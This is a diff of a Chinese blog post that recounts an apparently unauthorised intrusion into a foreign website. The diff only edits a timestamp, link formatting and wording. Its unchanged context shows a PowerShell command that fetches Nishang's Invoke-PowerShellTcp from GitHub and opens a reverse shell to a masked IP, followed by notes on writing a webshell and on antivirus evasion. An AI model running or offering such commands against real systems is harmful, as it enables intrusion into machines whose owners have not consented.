@@ -127,7 +127,7 @@
 <meta property="og:image" content="http://1234xxh.github.io/image/20191117/desk.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20191117/av1.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20191117/luyou.png">
-<meta property="og:updated_time" content="2020-02-08T08:30:27.655Z">
+<meta property="og:updated_time" content="2020-03-05T13:33:26.955Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透随笔-记一次境外网站渗透">
 <meta name="twitter:description" content="写下发生的故事，细品人生的乐趣。">
@@ -451,7 +451,7 @@
 <p>此时先写一个txt文件试探一下是否可行<br><img src="/image/20191117/txt.png" alt="image"></p>
 </blockquote>
 <blockquote>
-<p>虽然返回正常，但是无法访问<a href="http://xxx.xxx.xxx/a.txt，找不到资源，当时在想是不不能写，很无奈，就去尝试可不可以直接反弹shell" target="_blank" rel="noopener">http://xxx.xxx.xxx/a.txt，找不到资源，当时在想是不不能写，很无奈，就去尝试可不可以直接反弹shell</a>,</p>
+<p>虽然返回正常，但是无法访问 <a href="http://xxx.xxx.xxx/a.txt" target="_blank" rel="noopener">http://xxx.xxx.xxx/a.txt</a> ,找不到资源，当时在想是不不能写，很无奈，就去尝试可不可以直接反弹shell,</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress xxx.xxx.xxx.xxx -p 8080</span><br></pre></td></tr></table></figure>
 <blockquote>
@@ -470,7 +470,7 @@
 <blockquote>
 <p>嘻嘻嘻，欢欢喜喜写shell<br><img src="/image/20191117/shell.png" alt="image"></p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里普及一个小知识：</span><br><span class="line">&lt;&gt;在dos命令中需要转义，本地尝试了下，payload中知识&lt;&gt;需要转义。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里普及一个小知识：</span><br><span class="line">&apos;&lt;&gt;&apos;在dos命令中需要转义</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>访问a.aspx发现404，只能说需要上免杀，不过之前应该好奇看看是什么杀软（国外不会也用360吧23333）</p>
 </blockquote>
@@ -488,7 +488,7 @@
 <p><img src="/image/20191117/error1.png" alt="image"></p>
 </blockquote>
 <blockquote>
-<p>冰蝎连接也不行，仔细检查语句，始终连接不上<br>又是一个峰回路转，不断尝试新的payload，不同的姿势，终于使用 &gt;&gt; 追加符号写文件，居然可以成功getshell，仔细操作不多说，很简单的操作<br><img src="/image/20191117/getshell.png" alt="image"></p>
+<p>冰蝎连接也不行，仔细检查语句，始终连接不上<br>又是一个峰回路转，不断尝试新的payload，不同的姿势，终于使用 &gt;&gt; 追加符号写文件，居然可以成功getshell，详细操作不多说，很简单的操作<br><img src="/image/20191117/getshell.png" alt="image"></p>
 </blockquote>
 <blockquote>
 <p>至此成功getshell</p>
@@ -519,9 +519,6 @@
 </blockquote>
 <blockquote>
 <p>开始艰难的内网渗透（持续更新…）<br><img src="/image/20191117/luyou.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>感谢梦师傅的耐心指导，tql，我就是你的迷弟…</p>
 </blockquote>
 
       
